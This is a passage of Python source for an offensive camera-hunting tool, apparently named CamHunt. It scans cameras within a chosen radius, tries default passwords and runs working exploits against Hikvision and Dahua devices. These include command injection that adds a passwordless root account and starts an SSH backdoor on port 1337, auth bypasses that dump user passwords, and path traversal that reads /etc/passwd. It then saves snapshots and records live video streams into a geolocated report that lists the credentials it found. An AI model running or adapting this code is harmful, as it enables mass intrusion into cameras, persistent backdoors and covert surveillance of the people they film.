                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((ip, rport))
                        sock.send(f"OPTIONS rtsp://{ip}:{rport} RTSP/1.0\r\n\r\n".encode())
                        resp = sock.recv(1024).decode(errors="ignore")
                        sock.close()

                        if "RTSP/1.0" in resp or "RTSP/1.1" in resp:
                            result["urls"].append(rtsp_url)
                            if user and passwd:
                                result["credentials"] = {"rtsp_user": user, "rtsp_pass": passwd}
                            return result
                    except:
                        try:
                            sock.close()
                        except:
                            pass
        return None

    def _try_default_creds(self, ip, port, base_url):
        """Try default credentials against HTTP basic/digest auth"""
        found = {}
        for user, passwd in DEFAULT_CREDENTIALS:
            if not user:
                continue
            try:
                resp = requests.get(base_url, auth=(user, passwd),
                                    timeout=HTTP_TIMEOUT, verify=False)
                if resp.status_code == 200:
                    found = {"http_user": user, "http_pass": passwd}
                    print(f"\n  {c(Colors.OKGREEN)}[+] {ip}:{port} - Default creds: {user}:{passwd}{Colors.ENDC}")
                    break
                elif resp.status_code == 404:
                    continue
            except:
                continue
        return found

    def _try_snapshot(self, ip, port, base_url, credentials):
        """Try to get a snapshot/image from the camera"""
        auth = None
        if credentials.get("http_user"):
            auth = (credentials["http_user"], credentials.get("http_pass", ""))

        snapshot_paths = [
            "/axis-cgi/jpg/image.cgi",
            "/cgi-bin/jpg/image.cgi",
            "/cgi-bin/mjpg/mjpeg.cgi",
            "/anony/mjpg.cgi",
            "/snapshot.cgi",
            "/image.jpg",
            "/now.jpg",
            "/img/snapshot.cgi",
            "/camera.jpg",
            "/record?current",
            "/mjpg/video.mjpg",
            "/axis-media/media.amp",
        ]

        for path in snapshot_paths:
            url = f"{base_url}{path}"
            try:
                if auth and auth[0]:
                    resp = requests.get(url, auth=auth, timeout=5, verify=False)
                else:
                    resp = requests.get(url, timeout=5, verify=False)

                if resp.status_code == 200 and len(resp.content) > 1000:
                    content_type = resp.headers.get("Content-Type", "")
                    if "jpeg" in content_type or "jpg" in content_type or "image" in content_type or resp.content[:2] == b'\xff\xd8':
                        # Save snapshot
                        os.makedirs(self.snapshots_dir, exist_ok=True)
                        safe_ip = ip.replace(".", "_")
                        fname = f"{safe_ip}_{port}.jpg"
                        fpath = os.path.join(self.snapshots_dir, fname)
                        with open(fpath, "wb") as f:
                            f.write(resp.content)
                        self.stats["snapshots_taken"] += 1
                        print(f"\n  {c(Colors.OKGREEN)}[+] {ip}:{port} - Snapshot saved: {fname} ({len(resp.content)} bytes){Colors.ENDC}")
                        return url
            except:
                continue
        return ""

    def _try_exploit(self, ip, port, base_url, result):
        """Auto-exploit known camera vulnerabilities"""
        exploits = []

        brand = result.get("brand", "")
        data = result.get("data", "")
        server = result.get("server_header", "")
        title = result.get("title", "")

        # ── CVE-2017-7921: Hikvision Authentication Bypass ──
        if "Hikvision" in brand or "hikvision" in data.lower() or "hik" in server.lower():
            try:
                url = f"{base_url}/Security/users?auth=YWRtaW46MTEK"
                resp = requests.get(url, timeout=5, verify=False)
                if resp.status_code == 200 and "userName" in resp.text:
                    exploits.append({
                        "cve": "CVE-2017-7921",
                        "name": "Hikvision Authentication Bypass",
                        "type": "auth_bypass",
                        "status": "success",
                        "url": url,
                    })
                    self.stats["exploited"] += 1
                    print(f"\n  {c(Colors.RED)}[💀] {ip}:{port} - CVE-2017-7921 Exploited! User list accessible{Colors.ENDC}")

                    # Extract credentials
                    import re
                    users = re.findall(r'<userName>(.*?)</userName>', resp.text)
                    pws = re.findall(r'<password>(.*?)</password>', resp.text)
                    for u, p in zip(users, pws):
                        try:
                            decoded = base64.b64decode(p).decode()
                            exploits.append({"user": u, "password": decoded})
                        except:
                            exploits.append({"user": u, "password": p})
            except:
                pass

        # ── CVE-2021-36260: Hikvision RCE ──
        if "Hikvision" in brand or "hikvision" in data.lower():
            try:
                # Test command injection via SDK/webLanguage
                url = f"{base_url}/SDK/webLanguage"
                payload = "$(echo HACKED > webLib/x)"
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0",
                }
                resp = requests.put(url, data=payload, timeout=5, verify=False, headers=headers)
                if resp.status_code in [200, 500]:
                    # Verify
                    verify_resp = requests.get(f"{base_url}/x", timeout=5, verify=False)
                    if verify_resp.status_code == 200:
                        exploits.append({
                            "cve": "CVE-2021-36260",
                            "name": "Hikvision Command Injection RCE",
                            "type": "rce",
                            "status": "success",
                        })
                        self.stats["exploited"] += 1
                        print(f"\n  {c(Colors.RED)}[💀] {ip}:{port} - CVE-2021-36260 RCE Successful!{Colors.ENDC}")

                        # Try to add root user and enable SSH
                        try:
                            requests.put(f"{base_url}/SDK/webLanguage",
                                         data="$(echo -n P::0:0:W>N)", timeout=5, verify=False, headers=headers)
                            requests.put(f"{base_url}/SDK/webLanguage",
                                         data="$(echo :/:/bin/sh>>N)", timeout=5, verify=False, headers=headers)
                            requests.put(f"{base_url}/SDK/webLanguage",
                                         data="$(cat N>>/etc/passwd)", timeout=5, verify=False, headers=headers)
                            requests.put(f"{base_url}/SDK/webLanguage",
                                         data="$(dropbear -R -B -p 1337)", timeout=5, verify=False, headers=headers)
                            exploits.append({"backdoor": "SSH on port 1337 as root"})
                        except:
                            pass
            except:
                pass

        # ── CVE-2021-33044: Dahua Auth Bypass ──
        if "Dahua" in brand or "dahua" in data.lower() or "Dahua" in server:
            try:
                # Test Dahua auth bypass via NetKeyboard type
                url = f"{base_url}/RPC2_Login"
                headers = {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0",
                }
                payload = '{"method":"global.login","params":{"authorityType":"Default","clientType":"NetKeyboard","loginType":"Direct","password":"admin","passwordType":"Plain","userName":"admin"}}'
                resp = requests.post(url, json=json.loads(payload), timeout=5, verify=False, headers=headers)
                if resp.status_code == 200 and "id" in resp.text:
                    exploits.append({
                        "cve": "CVE-2021-33044",
                        "name": "Dahua Auth Bypass",
                        "type": "auth_bypass",
                        "status": "success",
                    })
                    self.stats["exploited"] += 1
                    print(f"\n  {c(Colors.RED)}[💀] {ip}:{port} - CVE-2021-33044 Dahua Auth Bypass!{Colors.ENDC}")

                    # Now try to get config
                    try:
                        config_url = f"{base_url}/RPC2_System"
                        config_payload = '{"method":"system.getDeviceInfo"}'
                        config_resp = requests.post(config_url, json=json.loads(config_payload), timeout=5, verify=False, headers=headers)
                        if config_resp.status_code == 200:
                            exploits.append({"config": config_resp.text[:500]})
                            # Save config
                            safe_ip = ip.replace(".", "_")
                            os.makedirs(self.output_dir, exist_ok=True)
                            with open(os.path.join(self.output_dir, f"{safe_ip}_config.json"), "w") as f:
                                f.write(config_resp.text)
                    except:
                        pass
            except:
                pass

        # ── CVE-2021-33190: Dahua NVR Path Traversal ──
        if "Dahua" in brand or "dahua" in data.lower():
            try:
                traversal_url = f"{base_url}/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd"
                resp = requests.get(traversal_url, timeout=5, verify=False)
                if resp.status_code == 200 and "root:" in resp.text:
                    exploits.append({
                        "cve": "CVE-2021-33190",
                        "name": "Dahua Path Traversal",
                        "type": "file_read",
                        "status": "success",
                    })
                    self.stats["exploited"] += 1
                    print(f"\n  {c(Colors.RED)}[💀] {ip}:{port} - CVE-2021-33190 Path Traversal!{Colors.ENDC}")
            except:
                pass

        # ── CVE-2021-27928: WS02 RCE ──
        if "WS02" in server or "wso2" in data.lower():
            try:
                rce_url = f"{base_url}/fileupload/toolsAny"
                rce_payload = '{"fileName":"../../../../../../etc/passwd"}'
                resp = requests.post(rce_url, json=json.loads(rce_payload), timeout=5, verify=False)
                if resp.status_code == 200:
                    exploits.append({
                        "cve": "CVE-2021-27928",
                        "name": "WS02 RCE",
                        "type": "rce",
                        "status": "tested",
                    })
            except:
                pass

        # ── CVE-2021-0302: Generic Android/Embedded ──
        if "android" in data.lower() or "linux" in data.lower():
            try:
                test_url = f"{base_url}/../../../../../../../../etc/passwd"
                resp = requests.get(test_url, timeout=5, verify=False)
                if resp.status_code == 200 and "root:" in resp.text:
                    exploits.append({
                        "cve": "CVE-2021-0302",
                        "name": "Path Traversal",
                        "type": "file_read",
                        "status": "success",
                    })
                    self.stats["exploited"] += 1
            except:
                pass

        # ── Axis Default Credentials ──
        if "Axis" in brand or "axis" in server.lower():
            for user, passwd in [("root", "root"), ("root", "admin"), ("admin", "admin"), ("root", "pass")]:
                try:
                    resp = requests.get(f"{base_url}/axis-cgi/jpg/image.cgi",
                                        auth=(user, passwd), timeout=5, verify=False)
                    if resp.status_code == 200 and len(resp.content) > 1000:
                        exploits.append({
                            "cve": "default_creds",
                            "name": f"Axis Default Credentials ({user}:{passwd})",
                            "type": "creds",
                            "status": "success",
                        })
                        safe_ip = ip.replace(".", "_")
                        os.makedirs(self.snapshots_dir, exist_ok=True)
                        fname = f"{safe_ip}_{port}_axis_exploit.jpg"
                        with open(os.path.join(self.snapshots_dir, fname), "wb") as f:
                            f.write(resp.content)
                        self.stats["snapshots_taken"] += 1
                        self.stats["exploited"] += 1
                        print(f"\n  {c(Colors.RED)}[💀] {ip}:{port} - Axis {user}:{passwd} - Snapshot saved!{Colors.ENDC}")
                        break
                except:
                    continue

        # ── Reolink Default Password ──
        if "Reolink" in brand or "reolink" in data.lower():
            for user, passwd in [("admin", ""), ("admin", "admin"), ("admin", "123456")]:
                try:
                    resp = requests.get(f"{base_url}/api.cgi?cmd=Login&user={user}&password={passwd}",
                                        timeout=5, verify=False)
                    if resp.status_code == 200 and "token" in resp.text.lower():
                        exploits.append({
                            "cve": "default_creds",
                            "name": f"Reolink Login ({user}:{passwd})",
                            "type": "creds",
                            "status": "success",
                            "token": resp.text[:200],
                        })
                        self.stats["exploited"] += 1
                        print(f"\n  {c(Colors.RED)}[💀] {ip}:{port} - Reolink {user}:{passwd} - Logged in!{Colors.ENDC}")
                        break
                except:
                    continue

        # ── Foscam Default Credentials ──
        if "Foscam" in brand or "foscam" in data.lower():
            for user, passwd in [("admin", ""), ("admin", "admin"), ("root", "root"), ("user", "user")]:
                try:
                    resp = requests.get(f"{base_url}/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr={user}&pwd={passwd}",
                                        timeout=5, verify=False)
                    if resp.status_code == 200 and len(resp.content) > 1000:
                        exploits.append({
                            "cve": "default_creds",
                            "name": f"Foscam Snapshot ({user}:{passwd})",
                            "type": "snapshot",
                            "status": "success",
                        })
                        self.stats["exploited"] += 1
                        print(f"\n  {c(Colors.RED)}[💀] {ip}:{port} - Foscam {user}:{passwd} - Snapshot!{Colors.ENDC}")
                        break
                except:
                    continue

        return exploits if exploits else None

    def _identify_brand(self, text):
        """Identify camera brand from text/headers"""
        if not text:
            return ""
        text_lower = text.lower()
        for brand, signatures in BRAND_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in text_lower:
                    return brand
        return ""

    # ──────────────────────────────────────────────────────────────
    # PHASE 4: STREAM CAPTURE
    # ──────────────────────────────────────────────────────────────

    def phase_4_stream_capture(self):
        print(f"\n{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")
        print(f"{c(Colors.BOLD)}📹 PHASE 4: RTSP STREAM CAPTURE{Colors.ENDC}")
        print(f"{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")

        if not self.stream_capture:
            print(f"  {c(Colors.WARNING)}[!] Stream capture disabled.{Colors.ENDC}")
            return

        # Check ffmpeg
        try:
            subprocess.run(["ffmpeg", "-version"], capture_output=True, timeout=5)
        except:
            print(f"  {c(Colors.WARNING)}[!] ffmpeg not found. Install with: sudo apt install ffmpeg{Colors.ENDC}")
            return

        # Collect cameras with RTSP
        rtsp_targets = []
        for cam in self.camera_results:
            if cam.get("rtsp_urls") and len(cam["rtsp_urls"]) > 0:
                for url in cam["rtsp_urls"][:3]:
                    rtsp_targets.append({"ip": cam["ip"], "url": url, "credentials": cam.get("credentials", {})})
            elif cam.get("has_rtsp") and not cam.get("rtsp_urls"):
                # Try to build RTSP URLs
                ip = cam["ip"]
                creds = cam.get("credentials", {})
                user = creds.get("rtsp_user", creds.get("http_user", "admin"))
                passwd = creds.get("rtsp_pass", creds.get("http_pass", "admin"))
                for pattern in RTSP_PATTERNS[:10]:
                    rtsp_url = f"rtsp://{user}:{passwd}@{ip}:554{pattern}"
                    rtsp_targets.append({"ip": ip, "url": rtsp_url, "credentials": creds})

        print(f"  {c(Colors.OKBLUE)}[*] Attempting stream capture on {len(rtsp_targets)} RTSP URLs...{Colors.ENDC}")

        os.makedirs(self.streams_dir, exist_ok=True)
        captured = 0

        for target in rtsp_targets[:50]:  # Limit to 50 stream attempts
            if not self.running:
                break
            ip = target["ip"]
            url = target["url"]
            safe_ip = ip.replace(".", "_")
            ts = datetime.now().strftime("%H%M%S")
            output_file = os.path.join(self.streams_dir, f"stream_{safe_ip}_{ts}.mp4")
            snapshot_file = os.path.join(self.streams_dir, f"thumb_{safe_ip}_{ts}.jpg")

            try:
                # Quick rtsp check
                parsed = urlparse(url)
                host = parsed.hostname
                port = parsed.port or 554
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                sock.send(f"OPTIONS rtsp://{host}:{port} RTSP/1.0\r\n\r\n".encode())
                resp = sock.recv(1024).decode(errors="ignore")
                sock.close()

                if "RTSP" not in resp:
                    continue

                # Capture 10 seconds of stream
                cmd = [
                    "ffmpeg", "-y",
                    "-rtsp_transport", "tcp",
                    "-i", url,
                    "-t", "10",
                    "-c", "copy",
                    "-an",
                    output_file,
                ]

                process = subprocess.run(cmd, capture_output=True, timeout=30)
                if process.returncode == 0 and os.path.exists(output_file) and os.path.getsize(output_file) > 10000:
                    captured += 1
                    self.stats["streams_captured"] += 1
                    print(f"\n  {c(Colors.OKGREEN)}[📹] {ip} - Stream captured ({os.path.getsize(output_file)//1024}KB){Colors.ENDC}")

                    # Generate thumbnail
                    thumb_cmd = [
                        "ffmpeg", "-y",
                        "-i", output_file,
                        "-ss", "00:00:01",
                        "-vframes", "1",
                        "-q:v", "2",
                        snapshot_file,
                    ]
                    subprocess.run(thumb_cmd, capture_output=True, timeout=10)

            except subprocess.TimeoutExpired:
                continue
            except Exception:
                continue

        print(f"  {c(Colors.OKGREEN)}[+] Stream capture complete: {captured} streams recorded{Colors.ENDC}")

    # ──────────────────────────────────────────────────────────────
    # REPORT GENERATION
    # ──────────────────────────────────────────────────────────────

    def _generate_html_report(self):
        """Generate an interactive HTML report with Leaflet map"""
        print(f"\n{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")
        print(f"{c(Colors.BOLD)}📊 PHASE 5: REPORT GENERATION{Colors.ENDC}")
        print(f"{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")

        os.makedirs(self.output_dir, exist_ok=True)

        # ── Generate Map (folium) ──
        map_path = os.path.join(self.output_dir, "map.html")
        if HAS_FOLIUM:
            try:
                m = folium.Map(location=[self.lat, self.lng], zoom_start=10,
                               tiles='https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}',
                               attr='Google Satellite')

                # Add radius circle
                folium.Circle(
                    radius=self.radius_km * 1000,
                    location=[self.lat, self.lng],
                    color='red',
                    fill=True,
                    fill_opacity=0.1,
                    weight=2,
                ).add_to(m)

                # Add center marker
                folium.Marker(
                    location=[self.lat, self.lng],
                    popup=f"<b>Scan Center</b><br>{self.lat}, {self.lng}<br>Radius: {self.radius_km}km",
                    icon=folium.Icon(color='red', icon='bullseye', prefix='fa'),
                ).add_to(m)

                # Add camera markers
                for cam in self.camera_results:
                    lat = cam.get("lat", self.lat)
                    lng = cam.get("lng", self.lng)
                    # If masscan source, use center point offset randomly
                    if cam.get("source") == "masscan":
                        import random
                        lat += random.uniform(-0.01, 0.01)
                        lng += random.uniform(-0.01, 0.01)

                    ip = cam["ip"]
                    brand = cam.get("brand", "Unknown")
                    port = cam.get("port", 80)
                    has_web = cam.get("has_web", False)
                    exploited = cam.get("exploited", False)
                    has_rtsp = cam.get("has_rtsp", False)

                    # Choose icon color based on status
                    if exploited:
                        icon_color = 'red'
                        icon_type = 'warning'
                    elif has_web:
                        icon_color = 'orange'
                        icon_type = 'camera'
                    elif has_rtsp:
                        icon_color = 'blue'
                        icon_type = 'film'
                    else:
                        icon_color = 'gray'
                        icon_type = 'info-circle'

                    popup_html = f"""
                    <div style="font-family:monospace; min-width:250px;">
                        <h4 style="color:#e74c3c; margin:0 0 5px 0;">{brand}</h4>
                        <b>IP:</b> {ip}:{port}<br>
                        <b>Status:</b> {'🟢 Open' if has_web else '🔵 RTSP' if has_rtsp else '⚪ Unknown'}<br>
                        <b>Exploited:</b> {'✅ Yes' if exploited else '❌ No'}<br>
                        <b>RTSP:</b> {'✅' if has_rtsp else '❌'}<br>
                        <a href='http://{ip}:{port}' target='_blank'>🔗 Open Camera</a>
                    """

                    if cam.get("credentials"):
                        creds = cam["credentials"]
                        if creds.get("http_user"):
                            popup_html += f"<br><b>Creds:</b> {creds['http_user']}:{creds.get('http_pass','')}"
                        if cam.get("exploit_details"):
                            popup_html += f"<br><b>Exploits:</b> {len(cam['exploit_details'])}"
                    popup_html += "</div>"

                    folium.Marker(
                        location=[lat, lng],
                        popup=folium.Popup(popup_html, max_width=350),
                        tooltip=f"{ip}:{port} ({brand})",
                        icon=folium.Icon(color=icon_color, icon=icon_type, prefix='fa'),
                    ).add_to(m)

                m.save(map_path)
                print(f"  {c(Colors.OKGREEN)}[+] Map saved: {map_path}{Colors.ENDC}")
            except Exception as e:
                print(f"  {c(Colors.WARNING)}[!] Map generation error: {e}{Colors.ENDC}")

        # ── Generate HTML Dashboard ──
        html_path = os.path.join(self.output_dir, "report.html")
        try:
            # Group by brand
            brands = {}
            for cam in self.camera_results:
                brand = cam.get("brand", "Unknown")
                if brand not in brands:
                    brands[brand] = []
                brands[brand].append(cam)

            # Count stats
            total = len(self.camera_results)
            exploited_count = sum(1 for c in self.camera_results if c.get("exploited"))
            web_count = sum(1 for c in self.camera_results if c.get("has_web"))
            rtsp_count = sum(1 for c in self.camera_results if c.get("has_rtsp"))
            snapshots = self.stats["snapshots_taken"]
            streams = self.stats["streams_captured"]

            # Build HTML
            html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CamHunt Global Recon Report</title>
<style>
    * {{ margin:0; padding:0; box-sizing:border-box; }}
    body {{ font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; background:#0a0a0a; color:#e0e0e0; }}
    .header {{ background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460); padding:30px; text-align:center; border-bottom:3px solid #e94560; }}
    .header h1 {{ color:#e94560; font-size:2.2em; letter-spacing:2px; }}
    .header p {{ color:#aaa; margin-top:5px; }}
    .stats-bar {{ display:flex; justify-content:center; flex-wrap:wrap; gap:15px; padding:25px; background:#111; }}
    .stat-card {{ background:#1a1a2e; border-radius:8px; padding:15px 25px; text-align:center; min-width:120px; border:1px solid #333; }}
    .stat-card .num {{ font-size:2em; font-weight:bold; color:#e94560; }}
    .stat-card .label {{ color:#888; font-size:0.85em; margin-top:5px; }}
    .container {{ max-width:1400px; margin:0 auto; padding:20px; }}
    .brand-section {{ margin-bottom:30px; }}
    .brand-title {{ color:#e94560; font-size:1.5em; border-bottom:2px solid #333; padding-bottom:10px; margin-bottom:15px; }}
    .camera-grid {{ display:grid; grid-template-columns:repeat(auto-fill,minmax(350px,1fr)); gap:15px; }}
    .camera-card {{ background:#1a1a2e; border-radius:8px; overflow:hidden; border:1px solid #333; transition:transform 0.2s; }}
    .camera-card:hover {{ transform:translateY(-3px); border-color:#e94560; }}
    .card-header {{ background:#16213e; padding:12px 15px; display:flex; justify-content:space-between; align-items:center; }}
    .card-header .ip {{ color:#4fc3f7; font-weight:bold; font-size:1.05em; }}
    .card-header .port {{ color:#888; }}
    .card-body {{ padding:15px; }}
    .card-body .info {{ margin-bottom:8px; font-size:0.9em; }}
    .card-body .info strong {{ color:#aaa; }}
    .badge {{ display:inline-block; padding:2px 8px; border-radius:3px; font-size:0.75em; font-weight:bold; margin-right:3px; }}
    .badge-exploited {{ background:#e94560; color:#fff; }}
    .badge-web {{ background:#2196f3; color:#fff; }}
    .badge-rtsp {{ background:#4caf50; color:#fff; }}
    .badge-brand {{ background:#ff9800; color:#000; }}
    .exploit-detail {{ background:#2a1a1a; border-left:3px solid #e94560; padding:8px; margin:5px 0; font-size:0.85em; }}
    .creds {{ color:#4caf50; font-family:monospace; }}
    .footer {{ text-align:center; padding:20px; color:#555; font-size:0.85em; border-top:1px solid #333; margin-top:30px; }}
    a {{ color:#4fc3f7; text-decoration:none; }}
    a:hover {{ text-decoration:underline; }}
</style>
</head>
<body>

<div class="header">
    <h1>⚡ CamHunt Global Recon</h1>
    <p>Geo-Intelligence Camera Reconnaissance Report</p>
    <p style="color:#666; font-size:0.85em; margin-top:5px;">
        📍 {self.lat}, {self.lng} | 📏 {self.radius_km}km radius | 🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    </p>
</div>

<div class="stats-bar">
    <div class="stat-card"><div class="num">{total}</div><div class="label">Total Cameras</div></div>
    <div class="stat-card" style="border-color:#e94560;"><div class="num">{exploited_count}</div><div class="label">💀 Exploited</div></div>
    <div class="stat-card" style="border-color:#2196f3;"><div class="num">{web_count}</div><div class="label">🌐 Web Accessible</div></div>
    <div class="stat-card" style="border-color:#4caf50;"><div class="num">{rtsp_count}</div><div class="label">📹 RTSP Open</div></div>
    <div class="stat-card"><div class="num">{snapshots}</div><div class="label">📸 Snapshots</div></div>
    <div class="stat-card"><div class="num">{streams}</div><div class="label">🎬 Streams</div></div>
</div>

<div class="container">
"""

            for brand, cams in sorted(brands.items()):
                html += f"""
    <div class="brand-section">
        <div class="brand-title">📷 {brand} ({len(cams)} cameras)</div>
        <div class="camera-grid">
"""

                for cam in cams:
                    ip = cam["ip"]
                    port = cam.get("port", 80)
                    url = cam.get("url", f"http://{ip}:{port}")
                    has_web = cam.get("has_web", False)
                    has_rtsp = cam.get("has_rtsp", False)
                    exploited = cam.get("exploited", False)
                    credentials = cam.get("credentials", {})
                    exploit_details = cam.get("exploit_details", [])
                    title = cam.get("title", "")
                    server = cam.get("server_header", "")

                    badges = ""
                    if exploited:
                        badges += '<span class="badge badge-exploited">💀 EXPLOITED</span> '
                    if has_web:
                        badges += '<span class="badge badge-web">🌐 WEB</span> '
                    if has_rtsp:
                        badges += '<span class="badge badge-rtsp">📹 RTSP</span> '
                    badges += f'<span class="badge badge-brand">{brand}</span>'

                    creds_html = ""
                    if credentials:
                        http_user = credentials.get("http_user", credentials.get("rtsp_user", ""))
                        http_pass = credentials.get("http_pass", credentials.get("rtsp_pass", ""))
                        if http_user:
                            creds_html = f'<div class="info"><strong>Credentials:</strong> <span class="creds">{http_user}:{http_pass}</span></div>'

                    exploits_html = ""
                    if exploit_details:
                        for exp in exploit_details[:4]:
                            if isinstance(exp, dict) and exp.get("cve"):
                                exploits_html += f'<div class="exploit-detail">💀 <strong>{exp.get("cve","")}</strong>: {exp.get("name","")} ({exp.get("status","")})</div>'

                    rtsp_urls = cam.get("rtsp_urls", [])
                    rtsp_html = ""
                    if rtsp_urls:
                        rtsp_html = f'<div class="info"><strong>RTSP:</strong> <a href="{rtsp_urls[0]}" target="_blank">🎬 Stream URL</a></div>'

                    html += f"""
            <div class="camera-card">
                <div class="card-header">
                    <span class="ip">🔌 {ip}:{port}</span>
                    <span class="port">{badges}</span>
                </div>
                <div class="card-body">
                    <div class="info"><strong>URL:</strong> <a href="{url}" target="_blank">🌐 Open Browser</a></div>
                    {creds_html}
                    {rtsp_html}
                    <div class="info"><strong>Server:</strong> {server[:80] if server else "N/A"}</div>
                    <div class="info"><strong>Title:</strong> {title[:80] if title else "N/A"}</div>
                    {exploits_html}
                </div>
            </div>
"""

                html += """
        </div>
    </div>
"""

            # Add snapshot gallery if any
            if snapshots > 0:
                html += """
    <div class="brand-section">
        <div class="brand-title">📸 Snapshot Gallery</div>
        <div style="display:grid; grid-template-columns:repeat(auto-fill,minmax(250px,1fr)); gap:10px;">
"""
                import glob
                snap_files = glob.glob(os.path.join(self.snapshots_dir, "*.jpg"))
                for snap in snap_files[:50]:
                    rel = os.path.relpath(snap, self.output_dir)
                    html += f'<div style="border:1px solid #333; border-radius:5px; overflow:hidden;"><a href="{rel}" target="_blank"><img src="{rel}" style="width:100%; height:180px; object-fit:cover;"></a></div>\n'
                html += """
        </div>
    </div>
"""

            # Add stream section if any
            if streams > 0:
                html += """
    <div class="brand-section">
        <div class="brand-title">🎬 Captured Streams</div>
        <div style="display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:10px;">
"""
                stream_files = glob.glob(os.path.join(self.streams_dir, "thumb_*.jpg"))
                for thumb in stream_files[:30]:
                    rel = os.path.relpath(thumb, self.output_dir)
                    # Find corresponding mp4
                    base = os.path.basename(thumb).replace("thumb_", "stream_").replace(".jpg", ".mp4")
                    mp4_rel = os.path.join("streams", base)
                    html += f'<div style="border:1px solid #333; border-radius:5px; overflow:hidden;"><a href="{mp4_rel}" target="_blank"><img src="{rel}" style="width:100%; height:180px; object-fit:cover;"></a><div style="padding:5px; font-size:0.8em; color:#888;">🎬 {base}</div></div>\n'
                html += """
        </div>
    </div>
"""

            html += f"""
</div>

<div class="footer">
    <p>CamHunt Global Recon v3.0 | Generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    <p>⚠ Authorized Penetration Testing Only</p>
</div>

</body>
</html>
"""

            with open(html_path, "w", encoding="utf-8") as f:
                f.write(html)
            print(f"  {c(Colors.OKGREEN)}[+] HTML report saved: {html_path}{Colors.ENDC}")

        except Exception as e:
            print(f"  {c(Colors.FAIL)}[!] HTML report error: {e}{Colors.ENDC}")

        # ── Save JSON data ──
        json_path = os.path.join(self.output_dir, "results.json")
        try:
            export_data = {
                "scan_parameters": {
                    "center_lat": self.lat,
                    "center_lng": self.lng,
                    "radius_km": self.radius_km,
                    "timestamp": datetime.now().isoformat(),
                },
                "stats": self.stats,
                "cameras": self.camera_results,
            }
            with open(json_path, "w", encoding="utf-8") as f:
                json.dump(export_data, f, indent=2, default=str)
            print(f"  {c(Colors.OKGREEN)}[+] JSON data saved: {json_path}{Colors.ENDC}")
        except Exception as e:
            print(f"  {c(Colors.FAIL)}[!] JSON save error: {e}{Colors.ENDC}")

        return html_path, map_path

    # ──────────────────────────────────────────────────────────────
    # CSV REPORT
    # ──────────────────────────────────────────────────────────────

    def _generate_csv_report(self):
        csv_path = os.path.join(self.output_dir, "results.csv")
        try:
            with open(csv_path, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow([
                    "IP", "Port", "Brand", "Has_Web", "Has_RTSP",
                    "Exploited", "Auth_Type", "HTTP_User", "HTTP_Pass",
                    "URL", "Snapshot_URL", "Source", "Server_Header",
                    "Title", "Lat", "Lng"
                ])
                for cam in self.camera_results:
                    creds = cam.get("credentials", {})
                    writer.writerow([
                        cam["ip"],
                        cam.get("port", 80),
                        cam.get("brand", ""),
                        cam.get("has_web", False),
                        cam.get("has_rtsp", False),
                        cam.get("exploited", False),
                        cam.get("auth_type", ""),
                        creds.get("http_user", creds.get("rtsp_user", "")),
                        creds.get("http_pass", creds.get("rtsp_pass", "")),
                        cam.get("url", ""),
                        cam.get("snapshot_url", ""),
                        cam.get("source", ""),
                        cam.get("server_header", ""),
                        cam.get("title", ""),
                        cam.get("lat", ""),
                        cam.get("lng", ""),
                    ])
            print(f"  {c(Colors.OKGREEN)}[+] CSV report saved: {csv_path}{Colors.ENDC}")
        except Exception as e:
            print(f"  {c(Colors.FAIL)}[!] CSV error: {e}{Colors.ENDC}")

    # ──────────────────────────────────────────────────────────────
    # SUMMARY
    # ──────────────────────────────────────────────────────────────

    def _print_summary(self):
        elapsed = time.time() - self.scan_start_time
        print(f"\n{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")
        print(f"{c(Colors.BOLD)}📊 SCAN SUMMARY{Colors.ENDC}")
        print(f"{c(Colors.HEADER)}═══════════════════════════════════════════════════════════════{Colors.ENDC}")
        print(f"{c(Colors.OKBLUE)}  Duration:    {elapsed:.1f} seconds ({elapsed/60:.1f} minutes){Colors.ENDC}")
        print(f"{c(Colors.OKBLUE)}  Coordinates: {self.lat}, {self.lng} (radius {self.radius_km}km){Colors.ENDC}")
        print(f"{c(Colors.OKBLUE)}  Area:        ~{math.pi * self.radius_km**2:.0f} km²{Colors.ENDC}")
        print(f"  {'─' * 50}")
        print(f"  {c(Colors.OKYELLOW)}📡 Shodan Results:  {self.stats['shodan_results']}{Colors.ENDC}")
        print(f"  {c(Colors.OKYELLOW)}⚡ Masscan Hosts:   {self.stats['masscan_hosts']}{Colors.ENDC}")
        print(f"  {c(Colors.OKYELLOW)}🔌 Open Ports:      {self.stats['masscan_open_ports']}{Colors.ENDC}")
        print(f"  {c(Colors.OKYELLOW)}📷 Cameras Found:   {self.stats['cameras_found']}{Colors.ENDC}")
        print(f"  {c(Colors.OKYELLOW)}🌐 Web Accessible:  {self.stats['web_accessible']}{Colors.ENDC}")
        print(f"  {c(Colors.OKYELLOW)}📸 Snapshots:       {self.stats['snapshots_taken']}{Colors.ENDC}")
        print(f"  {c(Colors.RED)}💀 Exploited:       {self.stats['exploited']}{Colors.ENDC}")
        print(f"  {c(Colors.OKGREEN)}📹 Streams Captured: {self.stats['streams_captured']}{Colors.ENDC}")
        print(f"  {'─' * 50}")

        # Print top exploited cameras
        exploited_cams = [c for c in self.camera_results if c.get("exploited")]
        if exploited_cams:
